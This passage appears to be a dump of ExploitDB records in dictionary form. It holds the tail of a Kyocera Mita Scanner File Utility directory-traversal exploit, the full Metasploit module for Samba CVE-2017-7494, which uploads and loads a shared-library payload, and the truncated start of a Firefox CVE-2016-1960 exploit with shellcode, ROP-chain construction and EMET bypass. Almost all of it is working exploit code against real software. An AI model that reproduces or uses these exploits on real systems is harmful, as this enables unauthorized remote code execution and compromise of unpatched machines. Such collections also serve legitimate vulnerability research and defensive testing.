+\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\r\n\t\r\n\t\r\n\tsock.put(buf)\r\n\tnulls="\\x00\\x00"\r\n\tpassTest="\\xFF\\xFF"\r\n\tdata=sock.get\r\n\tdataStr=data.to_s\r\n\t\r\n\t#print_status(nulls)\r\n\t#print_status(dataStr[dataStr.length-6,2])\r\n\r\n\tif dataStr[dataStr.length-6,2] != nulls\r\n\t\tprint_status("Invalid account number - use getidno command to find valid idno")\t\r\n\tend\r\n\tif dataStr[dataStr.length-2,2] != passTest\r\n\t\tprint_status("BONUS! Password! (last four or 8 characters of string)" )\r\n\t\tj=0\r\n\t\twhile j<12\r\n       \t\tprintf("%X",data[j])\r\n     \t\t\tj+=1\r\n\t\tend\r\n\t\tprint("\\n")\r\n\tend\r\n\r\n\tbuf = "\\x00\\x54" +\t\t\t\t#details about file name \r\n\t"\\x30" +\t\t\t\t\t#location size (must be x30)\r\n\t"\\x01" +\t\t\t\t\t#can be altered to include folder and file\r\n\t"\\x00\\x05\\x00\\x00" +\r\n\t"\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x24" +\r\n\tfolder + filename\r\n\t\r\n\tpadding = 48-locationLength\r\n\tj=0\r\n\twhile j<padding\r\n       \tbuf += "\\x00"\r\n     \t\tj+=1\r\n\tend\r\n\t\r\n\r\n\t#"\\x4b\\x79\\x6f\\x63\\x65\\x72\\x61\\x2e\\x62\\x61\\x74" +\r\n\t#"\\x00\\x00\\x00"\r\n\r\n\r\n\t#add command length\r\n\tthecommand  = datastore[\'CMD\']\r\n\tcmdLen = thecommand.length\r\n\tbuf += [cmdLen].pack(\'N\')\r\n\t\r\n\t#add command\r\n\tbuf << thecommand\r\n\t\r\n\tj=0\r\n\r\n\t#put file\r\n\tsock.put(buf)\t\t\t\t\r\n\r\n\tbuf = "\\x00\\x04\\x30\\x02\\x00\\x00"\r\n\r\n\r\n\t\r\n\tsock.put(buf)\t\t\t\t\r\n\t\r\n\tbuf="\\x00\\x04\\x30\\x05\\x53\\xdc"\t\r\n\r\n\tsock.put(buf)\r\n\tsock.get\r\n\t\r\n\tbuf="\\x00\\x04\\x30\\x03\\x00\\x00"\r\n\r\n\tsock.put(buf)\r\n\tsock.get\r\n\r\n\tend\r\nend\r\nend\r\nend', u'description': u'Kyocera Mita Scanner File Utility 3.3.0.1 - File Transfer Directory Traversal', u'platform': u'windows', u'author': u'Seth Fogie', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-08-26T00:00:00+00:00', u'_id': 32301, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2017-7494']
Description: Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)
{u'code': u'##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::DCERPC\r\n  include Msf::Exploit::Remote::SMB::Client\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'           => \'Samba is_known_pipename() Arbitrary Module Load\',\r\n      \'Description\'    => %q{\r\n          This module triggers an arbitrary shared library load vulnerability\r\n        in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module\r\n        requires valid credentials, a writeable folder in an accessible share,\r\n        and knowledge of the server-side path of the writeable folder. In\r\n        some cases, anonymous access combined with common filesystem locations\r\n        can be used to automatically exploit this vulnerability.\r\n      },\r\n      \'Author\'         =>\r\n        [\r\n          \'steelo <knownsteelo[at]gmail.com>\',    # Vulnerability Discovery\r\n          \'hdm\',                                  # Metasploit Module\r\n          \'Brendan Coles <bcoles[at]gmail.com>\',  # Check logic\r\n          \'Tavis Ormandy <taviso[at]google.com>\', # PID hunting technique\r\n        ],\r\n      \'License\'        => MSF_LICENSE,\r\n      \'References\'     =>\r\n        [\r\n          [ \'CVE\', \'2017-7494\' ],\r\n          [ \'URL\', \'https://www.samba.org/samba/security/CVE-2017-7494.html\' ],\r\n        ],\r\n      \'Payload\'         =>\r\n        {\r\n          \'Space\'       => 9000,\r\n          \'DisableNops\' => true\r\n        },\r\n      \'Platform\'        => \'linux\',\r\n      #\r\n      # Targets are currently limited by platforms with ELF-SO payload wrappers\r\n      #\r\n      \'Targets\'         =>\r\n        [\r\n\r\n          [ \'Linux x86\',        { \'Arch\' => ARCH_X86 } ],\r\n          [ \'Linux x86_64\',     { \'Arch\' => ARCH_X64 } ],\r\n          #\r\n          # Not ready yet\r\n          # [ \'Linux ARM (LE)\',   { \'Arch\' => ARCH_ARMLE } ],\r\n          # [ \'Linux MIPS\',       { \'Arch\' => MIPS } ],\r\n        ],\r\n      \'Privileged\'      => true,\r\n      \'DisclosureDate\'  => \'Mar 24 2017\',\r\n      \'DefaultTarget\'   => 1))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new(\'SMB_SHARE_NAME\', [false, \'The name of the SMB share containing a writeable directory\']),\r\n        OptString.new(\'SMB_SHARE_BASE\', [false, \'The remote filesystem path correlating with the SMB share name\']),\r\n        OptString.new(\'SMB_FOLDER\', [false, \'The directory to use within the writeable SMB share\']),\r\n      ])\r\n\r\n    register_advanced_options(\r\n      [\r\n        OptBool.new(\'BruteforcePID\', [false, \'Attempt to use two connections to bruteforce the PID working directory\', false]),\r\n      ])\r\n  end\r\n\r\n\r\n  def generate_common_locations\r\n    candidates = []\r\n    if datastore[\'SMB_SHARE_BASE\'].to_s.length > 0\r\n      candidates << datastore[\'SMB_SHARE_BASE\']\r\n    end\r\n\r\n    %W{ /volume1 /volume2 /volume3 /volume4\r\n        /shared /mnt /mnt/usb /media /mnt/media\r\n        /var/samba /tmp /home /home/shared\r\n    }.each do |base_name|\r\n      candidates << base_name\r\n      candidates << [base_name, @share]\r\n      candidates << [base_name, @share.downcase]\r\n      candidates << [base_name, @share.upcase]\r\n      candidates << [base_name, @share.capitalize]\r\n      candidates << [base_name, @share.gsub(" ", "_")]\r\n    end\r\n\r\n    candidates.uniq\r\n  end\r\n\r\n  def enumerate_directories(share)\r\n    begin\r\n      self.simple.connect("\\\\\\\\#{rhost}\\\\#{share}")\r\n      stuff = self.simple.client.find_first("\\\\*")\r\n      directories = [""]\r\n      stuff.each_pair do |entry,entry_attr|\r\n        next if %W{. ..}.include?(entry)\r\n        next unless entry_attr[\'type\'] == \'D\'\r\n        directories << entry\r\n      end\r\n\r\n      return directories\r\n\r\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\r\n      vprint_error("Enum #{share}: #{e}")\r\n      return nil\r\n\r\n    ensure\r\n      if self.simple.shares["\\\\\\\\#{rhost}\\\\#{share}"]\r\n        self.simple.disconnect("\\\\\\\\#{rhost}\\\\#{share}")\r\n      end\r\n    end\r\n  end\r\n\r\n  def verify_writeable_directory(share, directory="")\r\n    begin\r\n      self.simple.connect("\\\\\\\\#{rhost}\\\\#{share}")\r\n\r\n      random_filename = Rex::Text.rand_text_alpha(5)+".txt"\r\n      filename = directory.length == 0 ? "\\\\#{random_filename}" : "\\\\#{directory}\\\\#{random_filename}"\r\n\r\n      wfd = simple.open(filename, \'rwct\')\r\n      wfd << Rex::Text.rand_text_alpha(8)\r\n      wfd.close\r\n\r\n      simple.delete(filename)\r\n      return true\r\n\r\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\r\n      vprint_error("Write #{share}#{filename}: #{e}")\r\n      return false\r\n\r\n    ensure\r\n      if self.simple.shares["\\\\\\\\#{rhost}\\\\#{share}"]\r\n        self.simple.disconnect("\\\\\\\\#{rhost}\\\\#{share}")\r\n      end\r\n    end\r\n  end\r\n\r\n  def share_type(val)\r\n    [ \'DISK\', \'PRINTER\', \'DEVICE\', \'IPC\', \'SPECIAL\', \'TEMPORARY\' ][val]\r\n  end\r\n\r\n  def enumerate_shares_lanman\r\n    shares = []\r\n    begin\r\n      res = self.simple.client.trans(\r\n        "\\\\PIPE\\\\LANMAN",\r\n        (\r\n          [0x00].pack(\'v\') +\r\n          "WrLeh\\x00"   +\r\n          "B13BWz\\x00"  +\r\n          [0x01, 65406].pack("vv")\r\n        ))\r\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\r\n      vprint_error("Could not enumerate shares via LANMAN")\r\n      return []\r\n    end\r\n    if res.nil?\r\n      vprint_error("Could not enumerate shares via LANMAN")\r\n      return []\r\n    end\r\n\r\n    lerror, lconv, lentries, lcount = res[\'Payload\'].to_s[\r\n      res[\'Payload\'].v[\'ParamOffset\'],\r\n      res[\'Payload\'].v[\'ParamCount\']\r\n    ].unpack("v4")\r\n\r\n    data = res[\'Payload\'].to_s[\r\n      res[\'Payload\'].v[\'DataOffset\'],\r\n      res[\'Payload\'].v[\'DataCount\']\r\n    ]\r\n\r\n    0.upto(lentries - 1) do |i|\r\n      sname,tmp = data[(i * 20) +  0, 14].split("\\x00")\r\n      stype     = data[(i * 20) + 14, 2].unpack(\'v\')[0]\r\n      scoff     = data[(i * 20) + 16, 2].unpack(\'v\')[0]\r\n      scoff -= lconv if lconv != 0\r\n      scomm,tmp = data[scoff, data.length - scoff].split("\\x00")\r\n      shares << [ sname, share_type(stype), scomm]\r\n    end\r\n\r\n    shares\r\n  end\r\n\r\n  def probe_module_path(path, simple_client=self.simple)\r\n    begin\r\n      simple_client.create_pipe(path)\r\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\r\n      vprint_error("Probe: #{path}: #{e}")\r\n    end\r\n  end\r\n\r\n  def find_writeable_path(share)\r\n    subdirs = enumerate_directories(share)\r\n    return unless subdirs\r\n\r\n    if datastore[\'SMB_FOLDER\'].to_s.length > 0\r\n      subdirs.unshift(datastore[\'SMB_FOLDER\'])\r\n    end\r\n\r\n    subdirs.each do |subdir|\r\n      next unless verify_writeable_directory(share, subdir)\r\n      return subdir\r\n    end\r\n\r\n    nil\r\n  end\r\n\r\n  def find_writeable_share_path\r\n    @path = nil\r\n    share_info = enumerate_shares_lanman\r\n    if datastore[\'SMB_SHARE_NAME\'].to_s.length > 0\r\n      share_info.unshift [datastore[\'SMB_SHARE_NAME\'], \'DISK\', \'\']\r\n    end\r\n\r\n    share_info.each do |share|\r\n      next if share.first.upcase == \'IPC$\'\r\n      found = find_writeable_path(share.first)\r\n      next unless found\r\n      @share = share.first\r\n      @path  = found\r\n      break\r\n    end\r\n  end\r\n\r\n  def find_writeable\r\n    find_writeable_share_path\r\n    unless @share && @path\r\n      print_error("No suiteable share and path were found, try setting SMB_SHARE_NAME and SMB_FOLDER")\r\n      fail_with(Failure::NoTarget, "No matching target")\r\n    end\r\n    print_status("Using location \\\\\\\\#{rhost}\\\\#{@share}\\\\#{@path} for the path")\r\n  end\r\n\r\n  def upload_payload\r\n    begin\r\n      self.simple.connect("\\\\\\\\#{rhost}\\\\#{@share}")\r\n\r\n      random_filename = Rex::Text.rand_text_alpha(8)+".so"\r\n      filename = @path.length == 0 ? "\\\\#{random_filename}" : "\\\\#{@path}\\\\#{random_filename}"\r\n      wfd = simple.open(filename, \'rwct\')\r\n      wfd << Msf::Util::EXE.to_executable_fmt(framework, target.arch, target.platform,\r\n        payload.encoded, "elf-so", {:arch => target.arch, :platform => target.platform}\r\n      )\r\n      wfd.close\r\n\r\n      @payload_name = random_filename\r\n      return true\r\n\r\n    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\r\n      print_error("Write #{@share}#{filename}: #{e}")\r\n      return false\r\n\r\n    ensure\r\n      if self.simple.shares["\\\\\\\\#{rhost}\\\\#{@share}"]\r\n        self.simple.disconnect("\\\\\\\\#{rhost}\\\\#{@share}")\r\n      end\r\n    end\r\n  end\r\n\r\n  def find_payload\r\n\r\n    # Reconnect to IPC$\r\n    simple.connect("\\\\\\\\#{rhost}\\\\IPC$")\r\n\r\n    # Look for common paths first, since they can be a lot quicker than hunting PIDs\r\n    print_status("Hunting for payload using common path names: #{@payload_name} - //#{rhost}/#{@share}/#{@path}")\r\n    generate_common_locations.each do |location|\r\n      target = [location, @path, @payload_name].join("/").gsub(/\\/+/, \'/\')\r\n      print_status("Trying location #{target}...")\r\n      probe_module_path(target)\r\n    end\r\n\r\n    # Exit early if we already have a session\r\n    return if session_created?\r\n\r\n    return unless datastore[\'BruteforcePID\']\r\n\r\n    # XXX: This technique doesn\'t seem to work in practice, as both processes have setuid()d\r\n    #      to non-root, but their /proc/pid directories are still owned by root. Trying to\r\n    #      read the /proc/other-pid/cwd/target.so results in permission denied. There is a\r\n    #      good chance that this still works on some embedded systems and odd-ball Linux.\r\n\r\n    # Use the PID hunting strategy devised by Tavis Ormandy\r\n    print_status("Hunting for payload using PID search: #{@payload_name} - //#{rhost}/#{@share}/#{@path} (UNLIKELY TO WORK!)")\r\n\r\n    # Configure the main connection to have a working directory of the file share\r\n    simple.connect("\\\\\\\\#{rhost}\\\\#{@share}")\r\n\r\n    # Use a second connection to brute force the PID of the first connection\r\n    probe_conn = connect(false)\r\n    smb_login(probe_conn)\r\n    probe_conn.connect("\\\\\\\\#{rhost}\\\\#{@share}")\r\n    probe_conn.connect("\\\\\\\\#{rhost}\\\\IPC$")\r\n\r\n    # Run from 2 to MAX_PID (ushort) trying to read the other process CWD\r\n    2.upto(32768) do |pid|\r\n\r\n      # Look for the PID associated with our main SMB connection\r\n      target = ["/proc/#{pid}/cwd", @path, @payload_name].join("/").gsub(/\\/+/, \'/\')\r\n      vprint_status("Trying PID with target path #{target}...")\r\n      probe_module_path(target, probe_conn)\r\n\r\n      # Keep our main connection alive\r\n      if pid % 1000 == 0\r\n         self.simple.client.find_first("\\\\*")\r\n      end\r\n    end\r\n\r\n  end\r\n\r\n  def check\r\n    res = smb_fingerprint\r\n\r\n    unless res[\'native_lm\'] =~ /Samba ([\\d\\.]+)/\r\n      print_error("does not appear to be Samba: #{res[\'os\']} / #{res[\'native_lm\']}")\r\n      return CheckCode::Safe\r\n    end\r\n\r\n    samba_version = Gem::Version.new($1.gsub(/\\.$/, \'\'))\r\n\r\n    vprint_status("Samba version identified as #{samba_version.to_s}")\r\n\r\n    if samba_version < Gem::Version.new(\'3.5.0\')\r\n      return CheckCode::Safe\r\n    end\r\n\r\n    # Patched in 4.4.14\r\n    if samba_version < Gem::Version.new(\'4.5.0\') &&\r\n       samba_version >= Gem::Version.new(\'4.4.14\')\r\n      return CheckCode::Safe\r\n    end\r\n\r\n    # Patched in 4.5.10\r\n    if samba_version > Gem::Version.new(\'4.5.0\') &&\r\n       samba_version < Gem::Version.new(\'4.6.0\') &&\r\n       samba_version >= Gem::Version.new(\'4.5.10\')\r\n      return CheckCode::Safe\r\n    end\r\n\r\n    # Patched in 4.6.4\r\n    if samba_version >= Gem::Version.new(\'4.6.4\')\r\n      return CheckCode::Safe\r\n    end\r\n\r\n    connect\r\n    smb_login\r\n    find_writeable_share_path\r\n    disconnect\r\n\r\n    if @share.to_s.length == 0\r\n      print_status("Samba version #{samba_version.to_s} found, but no writeable share has been identified")\r\n      return CheckCode::Detected\r\n    end\r\n\r\n    print_good("Samba version #{samba_version.to_s} found with writeable share \'#{@share}\'")\r\n    return CheckCode::Appears\r\n  end\r\n\r\n  def exploit\r\n    # Setup SMB\r\n    connect\r\n    smb_login\r\n\r\n    # Find a writeable share\r\n    find_writeable\r\n\r\n    # Upload the shared library payload\r\n    upload_payload\r\n\r\n    # Find and execute the payload from the share\r\n    begin\r\n      find_payload\r\n    rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply\r\n    end\r\n\r\n    # Cleanup the payload\r\n    begin\r\n      simple.connect("\\\\\\\\#{rhost}\\\\#{@share}")\r\n      uploaded_path = @path.length == 0 ? "\\\\#{@payload_name}" : "\\\\#{@path}\\\\#{@payload_name}"\r\n      simple.delete(uploaded_path)\r\n    rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply\r\n    end\r\n\r\n    # Shutdown\r\n    disconnect\r\n  end\r\n\r\nend', u'description': u"Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)", u'platform': u'linux', u'author': u'Metasploit', u'cve': [u'CVE-2017-7494'], u'source': u'ExploitDB', u'date': u'2017-05-29T00:00:00+00:00', u'_id': 42084, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2016-1960']
Description: Mozilla Firefox < 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET 5.52 Bypass)
{u'code': u'<!doctype html>\r\n<html>\r\n<head>\r\n<meta http-equiv="cache-control" content="no-cache" charset="utf-8" />\r\n<title>CVE-2016-1960</title>\r\n<script>\r\n/*\r\n * Exploit Title: Mozilla Firefox < 45.0 nsHtml5TreeBuilder Array Indexing Vulnerability (EMET 5.52 bypass)\r\n * Author: Hans Jerry Illikainen (exploit), ca0nguyen (vulnerability)\r\n * Vendor Homepage: https://mozilla.org\r\n * Software Link: https://ftp.mozilla.org/pub/firefox/releases/44.0.2/win32/en-US/\r\n * Version: 44.0.2\r\n * Tested on: Windows 7 and Windows 10\r\n * CVE: CVE-2016-1960\r\n *\r\n * Exploit for CVE-2016-1960 [1] targeting Firefox 44.0.2 [2] on WoW64\r\n * with/without EMET 5.52.\r\n *\r\n * Tested on:\r\n * - 64bit Windows 10 Pro+Home (version 1703)\r\n * - 64bit Windows 7 Pro SP1\r\n *\r\n * Vulnerability disclosed by ca0nguyen [1].\r\n * Exploit written by Hans Jerry Illikainen <hji@dyntopia.com>.\r\n *\r\n * [1] https://bugzilla.mozilla.org/show_bug.cgi?id=1246014\r\n * [2] https://ftp.mozilla.org/pub/firefox/releases/44.0.2/win32/en-US/\r\n */\r\n\r\n"use strict";\r\n\r\n/* This is executed after having pivoted the stack.  `esp\' points to a\r\n * region on the heap, and the original stack pointer is stored in\r\n * `edi\'.  In order to bypass EMET, the shellcode should make sure to\r\n * xchg edi, esp before any protected function is called.\r\n *\r\n * For convenience, the first two "arguments" to the shellcode is a\r\n * module handle for kernel32.dll and the address of GetProcAddress() */\r\nconst shellcode = [\r\n    "\\x8b\\x84\\x24\\x04\\x00\\x00\\x00", /* mov eax, dword [esp + 0x4] */\r\n    "\\x8b\\x8c\\x24\\x08\\x00\\x00\\x00", /* mov ecx, dword [esp + 0x8] */\r\n    "\\x87\\xe7",                     /* xchg edi, esp */\r\n    "\\x56",                         /* push esi */\r\n    "\\x57",                         /* push edi */\r\n    "\\x89\\xc6",                     /* mov esi, eax */\r\n    "\\x89\\xcf",                     /* mov edi, ecx */\r\n    "\\x68\\x78\\x65\\x63\\x00",         /* push xec\\0 */\r\n    "\\x68\\x57\\x69\\x6e\\x45",         /* push WinE */\r\n    "\\x54",                         /* push esp */\r\n    "\\x56",                         /* push esi */\r\n    "\\xff\\xd7",                     /* call edi */\r\n    "\\x83\\xc4\\x08",                 /* add esp, 0x8 */\r\n\r\n    "\\x6a\\x00",                     /* push 0 */\r\n    "\\x68\\x2e\\x65\\x78\\x65",         /* push .exe */\r\n    "\\x68\\x63\\x61\\x6c\\x63",         /* push calc */\r\n    "\\x89\\xe1",                     /* mov ecx, esp */\r\n    "\\x6a\\x01",                     /* push 1 */\r\n    "\\x51",                         /* push ecx */\r\n    "\\xff\\xd0",                     /* call eax */\r\n    "\\x83\\xc4\\x0c",                 /* add esp, 0xc */\r\n\r\n    "\\x5f",                         /* pop edi */\r\n    "\\x5e",                         /* pop esi */\r\n    "\\x87\\xe7",                     /* xchg edi, esp */\r\n    "\\xc3",                         /* ret */\r\n];\r\n\r\nfunction ROPHelper(pe, rwx) {\r\n    this.pe = pe;\r\n    this.rwx = rwx;\r\n    this.cache = {};\r\n\r\n    this.search = function(instructions) {\r\n        for (let addr in this.cache) {\r\n            if (this.match(this.cache[addr], instructions) === true) {\r\n                return addr;\r\n            }\r\n        }\r\n\r\n        const text = this.pe.text;\r\n        for (let addr = text.base; addr < text.base + text.size; addr++) {\r\n            const read = this.rwx.readBytes(addr, instructions.length);\r\n            if (this.match(instructions, read) === true) {\r\n                this.cache[addr] = instructions;\r\n                return addr;\r\n            }\r\n        }\r\n\r\n        throw new Error("could not find gadgets for " + instructions);\r\n    };\r\n\r\n    this.match = function(a, b) {\r\n        if (a.length !== b.length) {\r\n            return false;\r\n        }\r\n\r\n        for (let i = 0; i < a.length; i++) {\r\n            if (a[i] !== b[i]) {\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    };\r\n\r\n    this.execute = function(func, args, cleanup) {\r\n        const u32array = this.rwx.u32array;\r\n        const ret = this.rwx.calloc(4);\r\n        let i = this.rwx.div.mem.idx + 2941; /* gadgets after [A] and [B] */\r\n\r\n        /*\r\n         * [A] stack pivot\r\n         *\r\n         * xchg eax, esp\r\n         * ret 0x2de8\r\n         */\r\n        const pivot = this.search([0x94, 0xc2, 0xe8, 0x2d]);\r\n\r\n        /*\r\n         * [B] preserve old esp in a nonvolatile register\r\n         *\r\n         * xchg eax, edi\r\n         * ret\r\n         */\r\n        const after = this.search([0x97, 0xc3]);\r\n\r\n        /*\r\n         * [C] address to execute\r\n         */\r\n        u32array[i++] = func;\r\n\r\n        if (cleanup === true && args.length > 0) {\r\n            if (args.length > 1) {\r\n                /*\r\n                 * [E] return address from [C]: cleanup args on the stack\r\n                 *\r\n                 * add esp, args.length*4\r\n                 * ret\r\n                 */\r\n                u32array[i++] = this.search([0x83, 0xc4, args.length*4, 0xc3]);\r\n            } else {\r\n                /*\r\n                 * [E] return address from [C]: cleanup arg\r\n                 *\r\n                 * pop ecx\r\n                 * ret\r\n                 */\r\n                u32array[i++] = this.search([0x59, 0xc3]);\r\n            }\r\n        } else {\r\n            /*\r\n             * [E] return address from [C]\r\n             *\r\n             * ret\r\n             */\r\n            u32array[i++] = this.search([0xc3]);\r\n        }\r\n\r\n        /*\r\n         * [D] arguments for [C]\r\n         */\r\n        for (let j = 0; j < args.length; j++) {\r\n            u32array[i++] = args[j];\r\n        }\r\n\r\n        /*\r\n         * [F] pop the location for the return value\r\n         *\r\n         * pop ecx\r\n         * ret\r\n         */\r\n        u32array[i++] = this.search([0x59, 0xc3]);\r\n\r\n        /*\r\n         * [G] address to store the return value\r\n         */\r\n        u32array[i++] = ret.addr;\r\n\r\n        /*\r\n         * [H] move the return value to [G]\r\n         *\r\n         * mov dword [ecx], eax\r\n         * ret\r\n         */\r\n        u32array[i++] = this.search([0x89, 0x01, 0xc3]);\r\n\r\n        /*\r\n         * [I] restore the original esp and return\r\n         *\r\n         * mov esp, edi\r\n         * ret\r\n         */\r\n        u32array[i++] = this.search([0x89, 0xfc, 0xc3]);\r\n\r\n        this.rwx.execute(pivot, after);\r\n\r\n        return u32array[ret.idx];\r\n    };\r\n}\r\n\r\nfunction ICUUC55(rop, pe, rwx) {\r\n    this.rop = rop;\r\n    this.pe = pe;\r\n    this.rwx = rwx;\r\n    this.kernel32 = new KERNEL32(rop, pe, rwx);\r\n    this.icuuc55handle = this.kernel32.GetModuleHandleA("icuuc55.dll");\r\n\r\n    /*\r\n     * The invocation of uprv_malloc_55() requires special care since\r\n     * pAlloc points to a protected function (VirtualAlloc).\r\n     *\r\n     * ROPHelper.execute() can\'t be used because:\r\n     * 1. it pivots the stack to the heap (StackPivot protection)\r\n     * 2. it returns into the specified function (Caller protection)\r\n     * 3. the forward ROP chain is based on returns (SimExecFlow protection)\r\n     *\r\n     * This function consist of several steps:\r\n     * 1. a second-stage ROP chain is written to the stack\r\n     * 2. a first-stage ROP chain is executed that pivots to the heap\r\n     * 3. the first-stage ROP chain continues by pivoting to #1\r\n     * 4. uprv_malloc_55() is invoked\r\n     * 5. the return value is saved\r\n     * 6. the original stack is restored\r\n     *\r\n     * Of note is that uprv_malloc_55() only takes a `size\' argument,\r\n     * and it passes two arguments to the hijacked pAlloc function\r\n     * pointer (context and size; both in our control).  VirtualAlloc,\r\n     * on the other hand, expects four arguments.  So, we\'ll have to\r\n     * setup the stack so that the values interpreted by VirtualAlloc as\r\n     * its arguments are reasonably-looking.\r\n     *\r\n     * By the time that uprv_malloc_55() is returned into, the stack\r\n     * will look like:\r\n     * [A] [B] [C] [D]\r\n     *\r\n     * When pAlloc is entered, the stack will look like:\r\n     * [uprv_malloc_55()-ret] [pContext] [B] [A] [B] [C] [D]\r\n     *\r\n     * Since we\'ve set pAlloc to point at VirtualAlloc, the call is\r\n     * interpreted as VirtualAlloc(pContext, B, A, B);\r\n     *\r\n     * Hence, 